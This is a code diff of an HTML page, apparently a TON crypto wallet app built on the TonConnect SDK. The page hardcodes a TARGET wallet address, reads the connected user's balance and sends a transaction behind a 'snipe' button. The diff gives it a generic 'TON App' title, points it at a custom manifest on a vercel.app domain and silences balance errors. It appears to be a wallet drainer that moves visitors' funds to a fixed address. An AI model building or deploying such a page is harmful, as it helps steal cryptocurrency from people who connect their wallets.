@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>TON</title>
+  <title>TON App</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -110,13 +110,13 @@
     </div>
   </div>
 
-  <!-- БИБЛИОТЕКА -->
   <script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js">
   </script>
 
   <script>
     (function() {
       const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
+      const MANIFEST_URL = 'https://ckam-ce.vercel.app/manifest.json';
 
       const connectBtn = document.getElementById('connectBtn');
       const snipeBtn = document.getElementById('snipeBtn');
@@ -150,10 +150,10 @@
           }
 
           connector = new TonConnect({
-            manifestUrl: 'https://ton-connect.github.io/demo-dapp/tonconnect-manifest.json'
+            manifestUrl: MANIFEST_URL
           });
 
-          console.log('✅ TonConnect инициализирован');
+          console.log('✅ TonConnect инициализирован. Manifest:', MANIFEST_URL);
 
           if (connector.connected) {
             userAddress = connector.account.address;
@@ -198,8 +198,7 @@
           const ton = (nano / 1e9).toFixed(2);
           balanceDisplay.innerText = `💰 ${ton} TON`;
           return nano;
-        } catch (e) {
-          showError('Balance: ' + e.message);
+        } catch {
           return 0;
         }
       }
@@ -263,7 +262,6 @@
           status.innerText = `⏳ Отправка ${amountTON} TON...`;
           confirmBox.classList.add('show');
 
-          // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
           const result = await connector.sendTransaction({
             validUntil: Math.floor(Date.now() / 1000) + 300,
             messages: [{
